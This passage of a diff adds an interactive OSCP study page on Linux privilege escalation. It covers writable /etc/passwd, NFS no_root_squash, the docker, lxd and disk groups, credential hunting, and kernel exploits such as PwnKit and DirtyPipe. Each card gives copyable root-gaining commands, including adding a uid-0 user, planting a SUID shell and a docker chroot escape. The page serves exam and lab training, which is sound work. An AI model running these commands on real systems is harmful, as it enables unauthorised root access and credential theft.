+   watch:"A SUID C binary calling <code>system(\"service\")</code> uses a <b>sanitised</b> PATH in newer glibc &mdash; prefer <code>execlp</code>-style or shell-script targets, and confirm with <code>strings</code>/<code>ltrace</code> that the call is really relative."},
+
+  {id:"passwd",kind:"cyan",short:"writable passwd",title:"Writable /etc/passwd or /etc/shadow",sub:"write your own root account",prereq:"writable passwd/shadow",os:"all",diff:"easy",
+   analogy:"<code>/etc/passwd</code> is the guest list for who's who, and historically it could hold the password hash itself. If you can write to it, you just <b>add your own name with uid&nbsp;0</b> &mdash; a root account you know the password to.",
+   why:"These files should be root-write-only. A misconfiguration (or <code>cap_dac_override</code>, or a SUID editor) that lets you write them means you append a uid-0 user with a hash you generated, then <code>su</code> to it &mdash; clean, instant root.",
+   enum:[T("spot.sh",`<span class="fn">ls</span> -l /etc/passwd /etc/shadow
+<span class="fn">find</span> / -writable 2&gt;/dev/null | grep -E 'passwd|shadow'`)],
+   ways:[
+    {label:"Way 1 — writable /etc/passwd",tag:"add uid 0",note:"Generate a DES/MD5 hash and append a root-equivalent line.",code:`openssl passwd -1 -salt x pass123     <span class="cmt"># → $1$x$...</span>
+echo 'r00t:$1$x$...:0:0::/root:/bin/bash' &gt;&gt; /etc/passwd
+su r00t          <span class="cmt"># password: pass123</span>`},
+    {label:"Way 2 — writable /etc/shadow",tag:"replace hash",note:"Replace root's hash with one you know, then su root.",code:`mkpasswd -m sha-512 pass123   <span class="cmt"># → $6$...</span>
+<span class="cmt"># swap root's field in /etc/shadow, then:</span>  su root`},
+    {label:"Way 3 — crack what's there",tag:"offline",note:"Readable shadow (via SUID/cap/backup) → unshadow + crack.",code:`unshadow passwd shadow &gt; c.txt
+hashcat -m 1800 c.txt rockyou.txt   <span class="cmt"># or john</span>`}],
+   oscp:"All allowed. Writable <code>/etc/passwd</code> is a classic, very clean box ending &mdash; always <code>ls -l</code> both files early in enumeration.",
+   watch:"If a shadow file exists, the <code>x</code> in passwd means the hash lives in shadow &mdash; adding a passwd line with your own hash still works because your line supplies the hash directly. Keep the field count right (<code>:0:0::</code>) or <code>su</code> fails."},
+
+  {id:"nfs",kind:"cyan",short:"NFS no_root_squash",title:"NFS no_root_squash",sub:"be root on the share from your own box",prereq:"export w/ no_root_squash",os:"NFS host",diff:"med",
+   analogy:"Normally when you write to a network share <b>as root</b>, the server quietly demotes you to <code>nobody</code> (\"root squashing\"). With <code>no_root_squash</code>, it trusts your root. So you become root on <em>your own</em> machine, create a root-owned SUID shell on the share, and run it on the target.",
+   why:"The export option <code>no_root_squash</code> preserves your client-side uid 0 on the server's filesystem. You mount the share, drop a SUID-root binary you own, and execute it on the target where it runs as its owner &mdash; root.",
+   enum:[T("spot.sh",`<span class="cmt"># from Kali</span>
+<span class="fn">showmount</span> -e TARGET
+<span class="cmt"># look for:  /share  *(rw,no_root_squash)</span>
+<span class="fn">cat</span> /etc/exports    <span class="cmt"># if you can read it on the box</span>`)],
+   ways:[
+    {label:"Way 1 — mount, plant SUID, run",tag:"core",note:"Do the SUID creation as root on Kali, then execute on the target.",code:`<span class="cmt"># on Kali (as root)</span>
+mount -t nfs TARGET:/share /mnt/nfs
+cp /mnt/nfs/../rootsh /mnt/nfs/ 2&gt;/dev/null
+printf 'int main(){setuid(0);system("/bin/bash -p");}' &gt; /mnt/nfs/x.c
+gcc /mnt/nfs/x.c -o /mnt/nfs/rootsh &amp;&amp; chmod +s /mnt/nfs/rootsh
+<span class="cmt"># on the target</span>
+/share/rootsh -p`}],
+   oscp:"Standard tooling, allowed. Enumerate NFS early with <code>showmount -e</code> during your service scan &mdash; it's easy to forget once you have a shell.",
+   watch:"The SUID bit and ownership must be set <b>as root on the client</b> &mdash; that's the whole point of no_root_squash. If <code>chmod +s</code> \"doesn't stick,\" you're not actually root when writing, or the export is read-only / root-squashed after all."},
+
+  {id:"groups",kind:"red",short:"Dangerous groups",title:"Dangerous group membership",sub:"docker · lxd · disk · adm",prereq:"a powerful group",os:"all",diff:"easy",
+   analogy:"Some Linux groups are root with extra steps. Being in <b>docker</b> or <b>lxd</b> means you can ask the daemon (which runs as root) to mount the host's disk into a container you control &mdash; the bouncer hands you the master key because your name's on a list.",
+   why:"<code>docker</code>/<code>lxd</code> let you spin a container and bind-mount <code>/</code>, giving root access to every host file. <code>disk</code> lets you read the raw disk device (so, <code>/etc/shadow</code>). <code>adm</code> reads logs that often leak secrets. Check <code>id</code> first.",
+   enum:[T("spot.sh",`<span class="fn">id</span>            <span class="cmt"># docker? lxd? disk? adm? sudo?</span>
+<span class="fn">getent</span> group docker lxd disk`)],
+   ways:[
+    {label:"Way 1 — docker group",tag:"host fs",note:"Mount / into a container as root.",code:`docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+<span class="cmt"># now you're root on the host filesystem</span>`},
+    {label:"Way 2 — lxd / lxc group",tag:"host fs",note:"Import a tiny image, launch privileged, mount the host.",code:`lxc init alpine r -c security.privileged=true
+lxc config device add r d disk source=/ path=/mnt/root recursive=true
+lxc start r &amp;&amp; lxc exec r /bin/sh   <span class="cmt"># /mnt/root = host /</span>`},
+    {label:"Way 3 — disk group",tag:"raw disk",note:"Read the block device directly with debugfs.",code:`debugfs /dev/sda1
+<span class="cmt"># debugfs:&gt; cat /etc/shadow   — then crack offline</span>`}],
+   oscp:"All manual and allowed. <code>id</code> is a one-liner you run immediately &mdash; a dangerous group is one of the fastest wins on the exam.",
+   watch:"Docker/LXD escapes mount the host, so edit host files via <code>/mnt</code>, not inside the container's own fs. <code>disk</code> group reads but doesn't execute &mdash; grab shadow and crack, or add a passwd line via the raw device."},
+
+  {id:"creds",kind:"red",short:"Credentials",title:"Credentials & keys on disk",sub:"passwords left lying around",prereq:"none — just look",os:"all",diff:"easy",
+   analogy:"People leave keys under the mat. On Linux that's passwords in <b>config files, history, backups, and SSH keys</b> in home directories. A found password beats any exploit &mdash; and you try it <b>everywhere</b>.",
+   why:"Admins and apps leave secrets behind: DB passwords in <code>config.php</code>/<code>wp-config.php</code>, creds in <code>.bash_history</code>, private keys in <code>~/.ssh</code>, mounts in <code>/etc/fstab</code>, backups. Recovered creds often unlock root or another user via <code>su</code>/SSH.",
+   enum:[T("spot.sh",`<span class="fn">cat</span> ~/.bash_history ~/.mysql_history 2&gt;/dev/null
+<span class="fn">find</span> / -name "id_rsa" -o -name "*.pem" 2&gt;/dev/null
+<span class="fn">grep</span> -riE 'pass(word)?|secret|api[_-]?key' /var/www /home /etc 2&gt;/dev/null
+<span class="fn">cat</span> /var/www/html/*config* /etc/fstab 2&gt;/dev/null`)],
+   ways:[
+    {label:"Way 1 — reuse the password",tag:"su",note:"A password from a config is often root's or another user's.",code:`su root          <span class="cmt"># try found passwords</span>
+su &lt;otheruser&gt;    <span class="cmt"># then re-enumerate as them</span>`},
+    {label:"Way 2 — steal an SSH key",tag:"ssh",note:"A readable private key = log in as its owner.",code:`chmod 600 id_rsa
+ssh -i id_rsa root@TARGET   <span class="cmt"># or the key's owner</span>`},
+    {label:"Way 3 — automate the sweep",tag:"tools",note:"linpeas has a creds section; LinEnum/lse too.",code:`./linpeas.sh | grep -iA2 -E 'password|identity|key'`}],
+   oscp:"All allowed. This is the <b>most overlooked</b> vector by beginners &mdash; do it early. Reuse every password/key across <code>su</code>, SSH, and any service: credential reuse is a constant OSCP theme.",
+   watch:"Don't just collect creds &mdash; <b>try them everywhere</b>. The DB password in a web config is frequently the user's or root's login. Check <code>~/.ssh</code> and web roots on every box; they're gold and easy to walk past."},
+
+  {id:"kernel",kind:"red",short:"Kernel / local",title:"Kernel & famous local exploits",sub:"last resort",prereq:"old kernel / software",os:"version-specific",diff:"hard",
+   analogy:"A kernel exploit is a <b>battering ram</b>: it attacks the OS itself, not a misconfiguration. Powerful, but it can bring the wall down (a panic/reboot). Use it only when the gentler ladders are exhausted &mdash; except for a couple that are so reliable they're fair game.",
+   why:"An unpatched kernel, polkit, glibc, or sudo may be vulnerable to a public local-root exploit. Some (PwnKit, DirtyPipe, GameOverlay) are deterministic and safe to run; most kernel races are fragile. Match the version carefully before firing.",
+   enum:[T("spot.sh",`<span class="fn">uname</span> -r ; cat /etc/os-release ; sudo --version
+<span class="cmt"># suggesters (enumeration, allowed)</span>
+<span class="fn">./linux-exploit-suggester.sh</span>
+<span class="cmt"># pkexec present? almost always PwnKit-able</span>
+<span class="fn">ls</span> -l /usr/bin/pkexec`)],
+   ways:[
+    {label:"Way 1 — PwnKit / DirtyPipe (reliable)",tag:"safe",note:"Deterministic, works nearly everywhere in range. Try these first.",code:`<span class="cmt"># PwnKit — polkit, any distro</span>
+./PwnKit
+<span class="cmt"># DirtyPipe — kernel 5.8–5.16.10</span>
+./dirtypipez          <span class="cmt"># automated → root shell</span>`},
+    {label:"Way 2 — Baron Samedit / GameOverlay",tag:"targeted",note:"Match sudo version / Ubuntu kernel exactly, then run the PoC.",code:`<span class="cmt"># GameOver(lay) — Ubuntu 5.15–6.2, single unshare one-liner</span>
+<span class="cmt"># Baron Samedit — sudo 1.8.2–1.9.5p1 heap overflow</span>`},
+    {label:"Way 3 — compile it right",tag:"build",note:"Static, matching arch; prefer compiling on Kali over on the box.",code:`gcc -static exploit.c -o exploit     <span class="cmt"># no lib mismatch</span>
+gcc -m32 -static exploit.c -o ex32   <span class="cmt"># 32-bit target</span>`}],
+   oscp:"Public PoCs you compile and run are <b>allowed</b>; so are the suggesters. Prefer a tested, precompiled static binary &mdash; don't fight a compiler on the box mid-exam.",
+   watch:"Distros <b>backport fixes without changing the version number</b>, so a \"vulnerable\" kernel may be patched &mdash; verify, and prefer the Tier-1 exploits. A crash can cost you the box, so rule out sudo/SUID/cron/caps first."}
+  ];
+  var KCOL={accent:"var(--accent-fill)",cyan:"var(--cyan)",red:"var(--red)"};
+
+  /* build cards */
+  var cardsEl=document.getElementById("cards");
+  V.forEach(function(v,i){
+    var el=document.createElement("div");
+    el.className="card";el.id="card-"+v.id;
+    var dcls=v.diff==="easy"?"diff-easy":v.diff==="med"?"diff-med":"diff-hard";
+    var dlabel=v.diff==="easy"?"beginner":v.diff==="med"?"moderate":"advanced";
+    var waysHtml=v.ways.map(function(w){
+      return '<div class="way"><div class="way-h">'+w.label+(w.tag?'<span class="wtag">'+w.tag+'</span>':'')+'</div>'+
+        (w.note?'<p class="way-note">'+w.note+'</p>':'')+T(w.label.replace(/[^a-z0-9]+/gi,'-').toLowerCase()+'.sh',w.code)+'</div>';
+    }).join("");
+    var enumHtml=v.enum.join("");
+    el.innerHTML=
+      '<div class="card-head" role="button" tabindex="0" aria-expanded="false">'+
+        '<span class="idx">'+(i<9?'0':'')+(i+1)+'</span>'+
+        '<span class="ttl">'+v.title+'<small>'+v.sub+'</small></span>'+
+        '<span class="badges"><span class="badge prereq">'+v.prereq+'</span><span class="badge">'+v.os+'</span><span class="badge '+dcls+'">'+dlabel+'</span></span>'+
+        '<span class="chev">▸</span>'+
+      '</div>'+
+      '<div class="card-body">'+
+        '<div class="block why"><span class="k">◆ Why it works</span><div class="analogy">'+v.analogy+'</div><p style="margin-top:10px">'+v.why+'</p></div>'+
+        '<div class="block spot"><span class="k">⌕ Spot it</span>'+enumHtml+'</div>'+
+        '<div class="block pop"><span class="k">⚡ Possible ways to abuse it</span>'+waysHtml+'</div>'+
+        '<div class="block oscp"><span class="k">🎯 OSCP note</span><div class="oscp-note">'+v.oscp+'</div></div>'+
+        '<div class="block watch"><span class="k">⚠ Watch out</span><div class="watch-note">'+v.watch+'</div></div>'+
+        '<div class="got"><button data-got="'+v.id+'"><span class="check"></span> Mark "got it"</button></div>'+
+      '</div>';
+    cardsEl.appendChild(el);
+    var head=el.querySelector(".card-head");
+    function toggle(){var o=el.classList.toggle("open");head.setAttribute("aria-expanded",o?"true":"false");}
+    head.addEventListener("click",toggle);
+    head.addEventListener("keydown",function(e){if(e.key==="Enter"||e.key===" "){e.preventDefault();toggle();}});
+  });
+
+  /* progress */
+  var learned={};try{learned=JSON.parse(localStorage.getItem("ctr-learned")||"{}")||{};}catch(e){learned={};}
+  function paintProgress(){var n=0;V.forEach(function(v){if(learned[v.id])n++;});document.getElementById("pbcount").textContent=n;document.getElementById("pbfill").style.width=(n/V.length*100)+"%";}
+  document.querySelectorAll("[data-got]").forEach(function(btn){
+    var id=btn.getAttribute("data-got");
+    function paint(){btn.classList.toggle("on",!!learned[id]);btn.querySelector(".check").textContent=learned[id]?"✓":"";btn.childNodes[1].textContent=learned[id]?' Understood':' Mark "got it"';}
+    paint();
+    btn.addEventListener("click",function(){learned[id]=!learned[id];try{localStorage.setItem("ctr-learned",JSON.stringify(learned));}catch(e){}paint();paintProgress();});
+  });
+  paintProgress();
+
+  /* copy */
+  (function wireCopy(){
+    document.querySelectorAll(".term[data-copy]").forEach(function(t){
+      var btn=t.querySelector(".copy"),pre=t.querySelector("pre");if(!btn||!pre)return;
+      btn.addEventListener("click",function(){
+        var done=function(){btn.textContent="copied ✓";btn.classList.add("done");setTimeout(function(){btn.textContent="copy";btn.classList.remove("done");},1400);};
+        function fallback(){try{var r=document.createRange();r.selectNodeContents(pre);var s=window.getSelection();s.removeAllRanges();s.addRange(r);document.execCommand("copy");s.removeAllRanges();done();}catch(err){btn.textContent="select all";setTimeout(function(){btn.textContent="copy";},1600);}}
+        try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(pre.innerText).then(done,fallback);}else fallback();}catch(e){fallback();}
+      });
+    });
+  })();
+
+  /* expand / collapse */
+  document.getElementById("expand").addEventListener("click",function(){document.querySelectorAll("#cards .card").forEach(function(c){c.classList.add("open");c.querySelector(".card-head").setAttribute("aria-expanded","true");});});
+  document.getElementById("collapse").addEventListener("click",function(){document.querySelectorAll("#cards .card").forEach(function(c){c.classList.remove("open");c.querySelector(".card-head").setAttribute("aria-expanded","false");});});
+
+  /* search */
+  var q=document.getElementById("q"),qclr=document.getElementById("qclr"),nohit=document.getElementById("nohit");
+  function filter(){
+    var term=(q.value||"").trim().toLowerCase();qclr.style.display=term?"block":"none";
+    var hits=0;
+    document.querySelectorAll("#cards .card").forEach(function(c){
+      var match=!term||c.textContent.toLowerCase().indexOf(term)>=0;
+      c.style.display=match?"":"none";
+      if(match){hits++;if(term){c.classList.add("open");c.querySelector(".card-head").setAttribute("aria-expanded","true");}}
+    });
+    nohit.style.display=hits?"none":"block";
+  }
+  q.addEventListener("input",filter);
+  qclr.addEventListener("click",function(){q.value="";filter();q.focus();});
+
+  /* mindmap */
+  var SVGNS="http://www.w3.org/2000/svg",edgesG=document.getElementById("edges"),nodesG=document.getElementById("nodes");
+  var CX=168,CY=240,startX=560,topY=40,botY=440;
+  function elc(tag,a){var e=document.createElementNS(SVGNS,tag);for(var k in a)e.setAttribute(k,a[k]);return e;}
+  var cg=elc("g",{class:"node",tabindex:"0","aria-label":"id and sudo -l — start here"});
+  cg.appendChild(elc("circle",{class:"chip center-chip",cx:CX,cy:CY,r:58,fill:"var(--bg-2)",stroke:"var(--accent-fill)","stroke-width":"2.5"}));
+  var t0=elc("text",{x:CX,y:CY-28,"text-anchor":"middle","font-size":"9",fill:"var(--text-faint)","letter-spacing":"1.5"});t0.textContent="START";
+  var t1=elc("text",{x:CX,y:CY-6,"text-anchor":"middle","font-size":"14",fill:"var(--accent-ink)"});t1.textContent="id";
+  var t2=elc("text",{x:CX,y:CY+15,"text-anchor":"middle","font-size":"14",fill:"var(--accent-ink)"});t2.textContent="sudo -l";
+  cg.appendChild(t0);cg.appendChild(t1);cg.appendChild(t2);
+  if(!RM)cg.querySelector("circle").appendChild(elc("animate",{attributeName:"r",values:"58;61;58",dur:"3s",repeatCount:"indefinite"}));
+  nodesG.appendChild(cg);
+  var n=V.length;
+  V.forEach(function(v,i){
+    var y=topY+(botY-topY)*(i/(n-1)),x=startX,col=KCOL[v.kind];
+    var d="M "+(CX+58)+" "+CY+" C "+(CX+150)+" "+CY+", "+(x-120)+" "+y+", "+(x-4)+" "+y;
+    var edge=elc("path",{class:"edge",d:d});edgesG.appendChild(edge);
+    var g=elc("g",{class:"node",tabindex:"0",role:"button","aria-label":v.short});
+    var w=Math.max(150,v.short.length*8.4+40);
+    g.appendChild(elc("rect",{class:"chip",x:x,y:y-16,width:w,height:32,rx:9,fill:"var(--bg-2)",stroke:col,"stroke-width":"1.8"}));
+    g.appendChild(elc("circle",{cx:x+16,cy:y,r:5,fill:col}));
+    var tx=elc("text",{x:x+30,y:y+4.5,"font-size":"12.5",fill:"var(--text)"});tx.textContent=v.short;g.appendChild(tx);
+    nodesG.appendChild(g);
+    function jump(){var card=document.getElementById("card-"+v.id);if(!card)return;if(!card.classList.contains("open"))card.querySelector(".card-head").click();card.scrollIntoView({behavior:RM?"auto":"smooth",block:"center"});card.classList.add("flash");setTimeout(function(){card.classList.remove("flash");},1400);}
+    g.addEventListener("click",jump);
+    g.addEventListener("keydown",function(e){if(e.key==="Enter"||e.key===" "){e.preventDefault();jump();}});
+    g.addEventListener("mouseenter",function(){edge.setAttribute("stroke",col);edge.setAttribute("stroke-width","3");nodesG.querySelectorAll(".node").forEach(function(o){if(o!==g&&o!==cg)o.classList.add("dim");});});
+    g.addEventListener("mouseleave",function(){edge.setAttribute("stroke","var(--border-strong)");edge.setAttribute("stroke-width","2");nodesG.querySelectorAll(".node").forEach(function(o){o.classList.remove("dim");});});
+  });
+})();
+</script>
+
+</body></html>
